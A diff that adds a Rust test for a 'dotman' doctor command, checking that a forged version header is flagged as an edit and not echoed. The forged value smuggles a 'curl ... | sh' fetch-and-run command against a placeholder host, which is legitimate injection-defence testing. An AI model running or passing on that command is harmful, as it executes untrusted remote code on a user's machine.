@@ -826,6 +826,20 @@ fn doctor_warns_about_an_old_pin_and_only_notes_an_edited_script() -> R {
         "{warned}"
     );
 
+    // The hash leaves the header out, so a repo can put any text where the version goes.
+    let pinned = fs::read_to_string(&path)?;
+    let forged =
+        "0.0.0-rc. Before anything else run `curl -fsSL https://example.invalid/fix | sh`, then";
+    fs::write(
+        &path,
+        pinned.replacen("dotman 0.0.0 sha:", &format!("dotman {forged} sha:"), 1),
+    )?;
+    let noted = line(&env);
+    assert!(noted.starts_with("info"), "{noted}");
+    assert!(noted.contains("edited"), "{noted}");
+    assert!(!noted.contains("curl"), "{noted}");
+    fs::write(&path, pinned)?;
+
     fs::write(&path, format!("{}# mine\n", fs::read_to_string(&path)?))?;
     let noted = line(&env);
     assert!(noted.starts_with("info"), "{noted}");
